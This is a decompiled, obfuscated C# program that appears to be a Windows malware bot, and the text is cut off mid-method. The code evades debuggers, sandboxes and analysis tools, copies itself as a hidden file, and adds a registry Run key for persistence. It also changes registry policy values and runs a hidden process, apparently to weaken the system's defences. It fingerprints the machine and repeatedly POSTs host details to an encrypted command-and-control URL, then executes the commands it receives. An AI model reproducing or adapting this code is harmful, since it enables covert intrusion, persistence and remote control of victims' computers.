using System;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

namespace ns0;

internal class Class2
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate0(string string_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate1();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long Delegate2(long long_0, bool bool_0, long long_1);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate3(IntPtr intptr_0, IntPtr intptr_1, StringBuilder stringBuilder_0, int int_0);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int Delegate4(ref Struct0 struct0_0, ref Struct0 struct0_1, int int_0);

	public class Class3
	{
		public static string smethod_0(byte[] byte_0)
		{
			char[] array = new char[24]
			{
				'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P',
				'Q', 'R', 'T', 'V', 'W', 'X', 'Y', '2', '3', '4',
				'6', '7', '8', '9'
			};
			char[] array2 = new char[29];
			ArrayList arrayList = new ArrayList();
			for (int i = 52; i <= 67; i++)
			{
				arrayList.Add(byte_0[i]);
			}
			for (int num = 28; num >= 0; num--)
			{
				if ((num + 1) % 6 == 0)
				{
					array2[num] = '-';
				}
				else
				{
					int num2 = 0;
					for (int num3 = 14; num3 >= 0; num3--)
					{
						int num4 = (num2 << 8) | (byte)arrayList[num3];
						arrayList[num3] = (byte)(num4 / 24);
						num2 = num4 % 24;
						array2[num] = array[num2];
					}
				}
			}
			return new string(array2);
		}
	}

	public struct Struct0
	{
		public int int_0;

		public int int_1;

		public int int_2;
	}

	private static bool bool_0 = false;

	private static bool bool_1 = false;

	private static bool bool_2 = false;

	private static bool bool_3 = false;

	private static bool bool_4 = false;

	private static bool bool_5 = false;

	private static bool bool_6 = false;

	private static bool bool_7 = false;

	private static bool bool_8 = false;

	private static bool bool_9 = false;

	private static bool bool_10 = false;

	private static bool bool_11 = false;

	private static bool bool_12 = false;

	private static bool bool_13 = false;

	private static bool bool_14 = false;

	private static string string_0 = GClass2.smethod_0("cŮɨͽѣկ٪ܪࡦॺ\u0a64");

	private static string string_1 = GClass2.smethod_0("OŒɑ\u0354Йԍ؎\u0741\u087b७ਲ਼ୱ\u0c62ഷ\u0e6a\u0f74ၾᅲተ፧ᑻᕽᙦ\u173eᡬᥡ\u1a60ᬣᱨᵥṧὦ\u2062Ⅵ≱〉⑳╪♱");

	private static string string_2 = GClass2.smethod_0("2Ĭȷ");

	private static string string_3 = GClass2.smethod_0("5Ĳȱ");

	private static string string_4 = CultureInfo.CurrentUICulture.Name.Substring(3);

	private static bool bool_15 = false;

	private static string string_5 = GClass2.smethod_0("Ašɯ\u0363Ѹ");

	private static bool bool_16 = false;

	private static bool bool_17 = false;

	private static bool bool_18 = false;

	private static bool bool_19 = false;

	private static bool bool_20 = false;

	private static bool bool_21 = false;

	private static string string_6 = GClass2.smethod_0("VŮɥ\u0368щչٸݦ\u087a\u094a\u0a63୶౷\u0d62\u0e65ཤ");

	private static string string_7 = GClass2.smethod_0("HŬɧ\u036eяջٺݨ\u0874\u0951੭୷౮\u0d64");

	private static string string_8 = smethod_5(smethod_7());

	private static bool bool_22 = false;

	private static IntPtr intptr_0;

	private static string string_9 = string.Empty;

	private static string string_10 = Environment.MachineName;

	private static GClass0 gclass0_0 = new GClass0();

	public static string string_11;

	private static string string_12 = string.Empty;

	private static string string_13 = smethod_8() + smethod_1();

	public static bool smethod_0(string string_14)
	{
		return Process.GetProcessesByName(string_14).Length > 0;
	}

	public static string smethod_1()
	{
		string text = GClass2.smethod_0("");
		if (Registry.LocalMachine.OpenSubKey(GClass2.smethod_0("fŌɞ\u034fѝՈ\u065a\u0742\u087aॡ\u0a41\u0b50\u0c41\u0d53\u0e49\u0f6f\u106aᅴታ፵ᑆᕊᙡᝤᡢᥰ\u1a79\u1b4f᱑ᵴṾύ⁼Ⅼ≠⍛⑸╦♫❢⡵⥶⩫⭱ⱞⴱ"))!.GetValue(GClass2.smethod_0("Cŭɭ\u0369Ѳլ٢ݪࡧॳ"))!.ToString()!.Contains(GClass2.smethod_0("{ĺȷ")))
		{
			return GClass2.smethod_0(")Ġȴ\u0334ХՆ٪ݶࠨ");
		}
		return text + GClass2.smethod_0(")Ġȱ\u0332ХՆ٪ݶࠨ");
	}

	public static string smethod_2()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(GClass2.smethod_0("xŦɧͳњՆ\u064dݎࡔळ"), GClass2.smethod_0("fűɿͷѲդ؏܄ࠍ४\u0a79\u0b65\u0c64ഈ\u0e70ཏ။ᄗሑ\u137dᑱᕒᙰ\u177dᡸ\u196f\u1a68᭵ᱫᴸṀ\u1f5e⁐ⅆ≖⌲\u2455╵♹❧⡮⥩⩂⭎Ⱙⴵ⸧⼡うㅔ㉖㌲㐦"));
		string result = GClass2.smethod_0("");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(GClass2.smethod_0("[Ÿɦ\u036bѢյٶݫ\u0871\u094b\u0a65")));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	public static string smethod_3()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(GClass2.smethod_0("xŦɧͳњՆ\u064dݎࡔळ"), GClass2.smethod_0("pŧɭ\u0365ќՊؽ\u0736࠻ड़\u0a4b\u0b57ౚശโ\u0f7dၽᄡሣፏᑙᕧᙩᝩᡤ᥉\u1a66᭦ᱳᵴṪὨ\u206fⅧ≳"));
		string result = GClass2.smethod_0("");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(GClass2.smethod_0("Oůɺ\u036bѵկٵݰࡪ७੯")));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	public static string smethod_4()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(GClass2.smethod_0("xŦɧͳњՆ\u064dݎࡔळ"), GClass2.smethod_0("pŧɭ\u0365ќՊؽ\u0736࠻ड़\u0a4b\u0b57ౚശโ\u0f7dၽᄡሣፏᑙᕧᙩᝩᡤ᥉\u1a66᭦ᱳᵴṪὨ\u206fⅧ≳"));
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(GClass2.smethod_0("Oůɺ\u036bѵկٵݰࡪ७੯")));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	public static string smethod_5(string string_14)
	{
		if (string_14 == null || string_14.Length == 0)
		{
			return string.Empty;
		}
		MD5 mD = new MD5CryptoServiceProvider();
		byte[] bytes = Encoding.Default.GetBytes(string_14);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString(GClass2.smethod_0("zĳ")));
		}
		return stringBuilder.ToString();
	}

	public static string smethod_6()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(GClass2.smethod_0("xŦɧͳњՆ\u064dݎࡔळ"), GClass2.smethod_0("Nřɗ\u035fњՌط\u073c࠵\u0952\u0a41ଢ଼\u0c5cര๘ཧ\u1063ᄿሹፕᑋᕩᙴᝣᡇᥫ\u1a62\u1b70ᱥ"));
		string result = GClass2.smethod_0("");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(((ManagementBaseObject)val2).get_Item(GClass2.smethod_0("_Ůɸ\u0360ѩիوݰࡩॡ੧୳")));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr intptr_1, string string_14);

	public static string smethod_7()
	{
		string text = smethod_2();
		string text2 = smethod_3();
		string text3 = smethod_6();
		return text + text2 + text3;
	}

	public static string smethod_8()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		string text = GClass2.smethod_0("");
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			if (oSVersion.Version.Minor == 10)
			{
				text = GClass2.smethod_0("]Šɦ\u0363ѩղٷܣ࠻ह");
			}
			if (oSVersion.Version.Minor == 90)
			{
				text = GClass2.smethod_0("]Šɦ\u0363ѩղٷܣࡏ।");
			}
		}
		if (oSVersion.Platform == PlatformID.Win32NT)
		{
			if (oSVersion.Version.Major == 4)
			{
				text = GClass2.smethod_0("YŤɢ\u036fѥվٻܧࡈ\u0951ਤଷబറ");
			}
			if (oSVersion.Version.Major == 5)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = GClass2.smethod_0("[Ţɤ\u036dѧհٵܥ࠶ळਲ\u0b31");
					break;
				case 1:
					text = GClass2.smethod_0("]Šɦ\u0363ѩղٷܣ\u085a\u0951");
					break;
				case 2:
					text = GClass2.smethod_0("DŻɿʹѠչپܬࡘ९\u0a7b\u0b7e\u0c62൴ล༶\u1033ᄲሲ");
					break;
				}
			}
			if (oSVersion.Version.Major == 6)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = GClass2.smethod_0("Zťɥ\u036eѦտٴܦࡓ७\u0a70୶ౠ");
					break;
				case 1:
					text = GClass2.smethod_0("^šɩ\u0362Ѫճ\u0670ܢ࠶");
					break;
				}
			}
		}
		if (text == GClass2.smethod_0(""))
		{
			text = GClass2.smethod_0("OŷɺͲѽմٺݽࡦॴਰ\u0b58౧\u0d63\u0e68ཤၽᅺሥፑᑣᕷᙷᝪᡭ\u196f");
		}
		return text;
	}

	private static string smethod_9(string string_14, string string_15)
	{
		ServicePointManager.Expect100Continue = false;
		WebRequest webRequest = WebRequest.Create(string_14);
		webRequest.ContentType = GClass2.smethod_0("@ŐɯͲѴտٺݮ\u0870ॷ\u0a79ହ౭ഹ\u0e64ཥၦᄽቩ፡ᑿᕡᘦ\u177f\u187bᥤ\u1a62᭨ᱦᵫṧὧ\u2065");
		webRequest.Method = GClass2.smethod_0("TŌɑ\u0355");
		byte[] bytes = Encoding.ASCII.GetBytes(string_15);
		webRequest.ContentLength = bytes.Length;
		Stream requestStream = webRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = webRequest.GetResponse();
		if (response == null)
		{
			return null;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibrary(string string_14);

	private static void Main(string[] args)
	{
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Expected O, but got Unknown
		try
		{
			if (!bool_20)
			{
				Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.DeleteValue(GClass2.smethod_0("GŊȭ\u034dѾծ٠ݧ\u0827\u0942\u0a77୭\u0c75൧\u0e73"));
			}
			else
			{
				Registry.LocalMachine.OpenSubKey(GClass2.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.DeleteValue(GClass2.smethod_0("GŊȭ\u034dѾծ٠ݧ\u0827\u0942\u0a77୭\u0c75൧\u0e73"));
			}
		}
		catch
		{
		}
		bool createdNew = false;
		new Mutex(initiallyOwned: true, GClass2.smethod_0("Oůɨ\u036cхտٱݡ࠱ष\u0a37"), out createdNew);
		if (!createdNew)
		{
			return;
		}
		if (bool_21)
		{
			try
			{
				new Thread(smethod_16).Start();
			}
			catch
			{
			}
		}
		if (bool_1)
		{
			try
			{
				if (Debugger.IsAttached)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_2)
		{
			try
			{
				long num = 0L;
				num = DateTime.Now.Ticks;
				Thread.Sleep(10);
				if (DateTime.Now.Ticks - num < 10L)
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_4)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("IŃɑ\u0357їՃ\u0655")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_9)
		{
			try
			{
				Form val = new Form();
				((Control)val).set_Text(GClass2.smethod_0("Pņɑ\u0355"));
				val.set_Opacity(0.0);
				val.set_ShowInTaskbar(false);
				((Control)val).Show();
				if (((Control)val).get_Text() == GClass2.smethod_0("WĨɗ\u0329ќՂ\u0655ݑࠤक़ਡଡ଼"))
				{
					return;
				}
				val.Close();
			}
			catch
			{
			}
		}
		if (bool_3)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("Aŏɉ\u0341юՍ\u064f")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_7)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("WŔɊ\u0347юՍ\u064f")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_8)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("TŀɃ\u034eэՏ")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_0)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("Głɋ\u034f")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_5)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("Hŀɐ\u034eэՏ")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_10)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("SŅɕ\u0352ъՇ\u0656")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_14)
		{
			try
			{
				if (smethod_0(GClass2.smethod_0("^Łɕ\u0343іՌقݐࡊ")))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_6)
		{
			try
			{
				if (smethod_4() == GClass2.smethod_0("Gŷɧ\u0375ѿվٴݼ\u087cमਜ਼\u0b65౯൯\u0e66༨၆ᅢቤ፴ᑷᕧᙳ"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_13)
		{
			try
			{
				if (smethod_4() == GClass2.smethod_0("Xŀɻ\u036aѸլبݔࡐ\u0942\u0a45ଣ\u0c4b\u0d48"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_11)
		{
			try
			{
				if (smethod_4() == GClass2.smethod_0("Mųɫ\u036cѢշٹݖ\u087c४\u0a31\u0b57౽൯\u0e7dཤ\u1062ᅩቺጨᑆᕢᙤ\u1774ᡷᥧ\u1a73"))
				{
					return;
				}
			}
			catch
			{
			}
		}
		if (bool_12)
		{
			try
			{
				string[] array = new string[2]
				{
					GClass2.smethod_0("Oŕȷ\u0357ѱհٺݦ\u0878ॿ\u0a61\u0b7dభൟ\u0e38༪ၝᅺቮ፩ᐶᔶᘬ\u1734ᠵ"),
					GClass2.smethod_0("_ĸȪ\u035dѺծ٩\u0736࠶ब\u0a34ଵ")
				};
				for (int i = 0; i < array.Length; i++)
				{
					if (smethod_4() == array[i])
					{
						return;
					}
				}
			}
			catch
			{
			}
		}
		if (bool_15)
		{
			try
			{
				Thread.Sleep(Convert.ToInt32(string_5) * 1000);
			}
			catch
			{
			}
		}
		try
		{
			Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("hŕɟ\u034cр\u0557هݑ\u086fॿ\u0a58\u0b53\u0c5d\u0d41\u0e5eགྷ၍ᅞት\u137fᑎᕈᙁᝋᡔᥑ\u1a7d᭣ᱪᵬṯό⁵Ⅾ≏⍽⑥╥♼❻⡽⥎⩔⭨Ɀⵢ\u2e62⽾のㅸ㉕㍉㑣㕰㙤㝪㡠㥧㩥"), writable: true)!.SetValue(GClass2.smethod_0("NŬɠ\u0367ѧկ"), GClass2.smethod_0("3"), RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			FileStream fileStream = new FileStream(Process.GetCurrentProcess().MainModule!.FileName, FileMode.Open, FileAccess.Read);
			byte[] array2 = new byte[fileStream.Length];
			fileStream.Read(array2, 0, array2.Length);
			fileStream.Close();
			FileStream fileStream2 = new FileStream(Environment.GetEnvironmentVariable(GClass2.smethod_0("FŖɕ\u0340тՖـ")) + GClass2.smethod_0("]") + string_0, FileMode.Create);
			fileStream2.Write(array2, 0, array2.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			File.SetAttributes(Environment.GetEnvironmentVariable(GClass2.smethod_0("FŖɕ\u0340тՖـ")) + GClass2.smethod_0("]") + string_0, FileAttributes.Hidden);
		}
		catch
		{
		}
		try
		{
			if (!bool_20)
			{
				Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.SetValue(GClass2.smethod_0("GŊȭ\u034dѾծ٠ݧ\u0827\u0942\u0a77୭\u0c75൧\u0e73"), Environment.GetEnvironmentVariable(GClass2.smethod_0("FŖɕ\u0340тՖـ")) + GClass2.smethod_0("]") + string_0);
			}
			else
			{
				Registry.LocalMachine.OpenSubKey(GClass2.smethod_0("~Ńɍ\u035eўՉ\u0655\u0743\u0879३\u0a4a\u0b41\u0c53൏\u0e6c\u0f71ၻᅨቇፍᑰᕶᙳ\u1779ᡢᥧᩏ᭑ᱤᵢṽὫ\u2063ⅸ≝⍯⑻╻♮❩⡫⥘⩑⭷Ɐ"), writable: true)!.SetValue(GClass2.smethod_0("GŊȭ\u034dѾծ٠ݧ\u0827\u0942\u0a77୭\u0c75൧\u0e73"), Environment.GetEnvironmentVariable(GClass2.smethod_0("FŖɕ\u0340тՖـ")) + GClass2.smethod_0("]") + string_0);
			}
		}
		catch
		{
		}
		if (bool_20)
		{
			try
			{
				Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("hŕɟ\u034cр\u0557هݑ\u086fॿ\u0a58\u0b53\u0c5d\u0d41\u0e5eགྷ၍ᅞት\u137fᑎᕈᙁᝋᡔᥑ\u1a7d᭣ᱪᵬṯό⁵Ⅾ≏⍽⑥╥♼❻⡽⥎⩔⭨Ɀⵢ\u2e62⽾のㅸ㉕㍉㑣㕰㙤㝪㡠㥧㩥"), writable: true)!.SetValue(GClass2.smethod_0("Tžɮ\u036cѡթىݫࡥ।੨୩౫\u0d50\u0e6a\u0f72\u1072"), GClass2.smethod_0("1"), RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass2.smethod_0("LŦɦ\u0364ѩա\u064fݗࡀ"), GClass2.smethod_0("1"), RegistryValueKind.DWord);
				Registry.LocalMachine.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass2.smethod_0("LŦɦ\u0364ѩա\u064fݗࡀ"), GClass2.smethod_0("1"), RegistryValueKind.DWord);
			}
			catch
			{
			}
			if (bool_16)
			{
				if (Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("yņɎ\u0353ёՄ\u0656\u0746\u087eॱ\u0a4f୳౷ൾ\u0e75\u0f7e\u1069ᅅቕ\u137eᑵᕧᙻᝠ\u187d\u1977\u1a64᭓᱙ᵤṢὯ\u2065ⅾ≻⍛\u2455╼♷❷⡧⥬")) != null)
				{
					Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("yņɎ\u0353ёՄ\u0656\u0746\u087eॱ\u0a4f୳౷ൾ\u0e75\u0f7e\u1069ᅅቕ\u137eᑵᕧᙻᝠ\u187d\u1977\u1a64᭓᱙ᵤṢὯ\u2065ⅾ≻⍛\u2455╼♷❷⡧⥬"), writable: true)!.SetValue(GClass2.smethod_0("NŠɻ\u0366Ѥթ١\u0740ࡏ\u0945"), GClass2.smethod_0("3"), RegistryValueKind.DWord);
				}
				else
				{
					Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("yņɎ\u0353ёՄ\u0656\u0746\u087eॱ\u0a4f୳౷ൾ\u0e75\u0f7e\u1069ᅅቕ\u137eᑵᕧᙻᝠ\u187d\u1977\u1a64᭓᱙ᵤṢὯ\u2065ⅾ≻⍛\u2455╼♷❷⡧⥬"));
					Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("yņɎ\u0353ёՄ\u0656\u0746\u087eॱ\u0a4f୳౷ൾ\u0e75\u0f7e\u1069ᅅቕ\u137eᑵᕧᙻᝠ\u187d\u1977\u1a64᭓᱙ᵤṢὯ\u2065ⅾ≻⍛\u2455╼♷❷⡧⥬"), writable: true)!.SetValue(GClass2.smethod_0("NŠɻ\u0366Ѥթ١\u0740ࡏ\u0945"), GClass2.smethod_0("3"), RegistryValueKind.DWord);
				}
			}
			if (bool_17)
			{
				try
				{
					Process process = new Process();
					process.StartInfo.FileName = GClass2.smethod_0("Kšɷͱѩ");
					process.StartInfo.Arguments = GClass2.smethod_0("iŃɐ\u0343эՑهݖࡁॳੲଽ౯ൾ\u0e6e\u0f39ၛᅢቤ፧ᑱᕽᙦᝡᡢᥠ\u1a68᭤ᱠᵮḪ\u1f5a⁼Ⅶ≲⍠␤╬♤❧");
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
				}
				catch
				{
				}
			}
			if (bool_18)
			{
				try
				{
					if (Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬")) != null)
					{
						Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass2.smethod_0("PźɡͰѲգ٫ݟࡩ६\u0a63\u0b7a౼൵\u0e7fད\u106bᅬቮ፲"), GClass2.smethod_0("0"), RegistryValueKind.DWord);
					}
					else
					{
						Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
						Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass2.smethod_0("PźɡͰѲգ٫ݟࡩ६\u0a63\u0b7a౼൵\u0e7fད\u106bᅬቮ፲"), GClass2.smethod_0("0"), RegistryValueKind.DWord);
					}
				}
				catch
				{
				}
			}
			if (bool_19)
			{
				try
				{
					if (Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬")) != null)
					{
						Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass2.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), GClass2.smethod_0("0"), RegistryValueKind.DWord);
					}
					else
					{
						Registry.CurrentUser.CreateSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"));
						Registry.CurrentUser.OpenSubKey(GClass2.smethod_0("jŗɑ\u0342тՕفݗ\u086dॽ\u0a46\u0b4d\u0c5f\u0d43๘ཅ၏ᅜቻ፱ᑌᕊᙇᝍᡖᥓᩃ᭝ᱨᵮṩ\u1f7f⁷Ⅼ≁⍳⑧╧♺❽⡿⥌⩟⭡ⱡⵥ\u2e68⽣ぬㅻ㉛㍕㑼㕷㙷㝧㡬"), writable: true)!.SetValue(GClass2.smethod_0("JŤɿ\u036aѨե٭ݓࡧॶ੯\u0b4e\u0c65൳"), GClass2.smethod_0("0"), RegistryValueKind.DWord);
					}
				}
				catch
				{
				}
			}
		}
		if (bool_22)
		{
			try
			{
				if (Application.get_ExecutablePath().Contains(Environment.GetEnvironmentVariable(GClass2.smethod_0("FŖɕ\u0340тՖـ"))))
				{
				}
			}
			catch
			{
			}
			Environment.Exit(0);
		}
		while (true)
		{
			try
			{
				string string_ = GClass2.smethod_0("wťɫ\u0365Ѯէؼ") + string_10 + GClass2.smethod_0(".ťɩͱѲզ\u0670\u073c") + string_2 + GClass2.smethod_0("/ūɨͳѫհٱݻ࠼") + string_4 + GClass2.smethod_0(".Űɯ\u036bѲզ\u0670\u073c") + string_13 + GClass2.smethod_0(" ŭɳ\u036aѦԼ") + string_8;
				string text = smethod_9(string_1, string_);
				if (text.Length == 0)
				{
					try
					{
						Class0.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class6.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class8.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class4.smethod_1();
					}
					catch
					{
					}
					string_9 = string.Empty;
				}
				else if (text != string_9)
				{
					smethod_12(text);
					string_9 = text;
				}
			}
			catch
			{
			}
			Thread.Sleep(Convert.ToInt32(string_3) * 1000);
		}
	}

	public static long smethod_10(string string_14)
	{
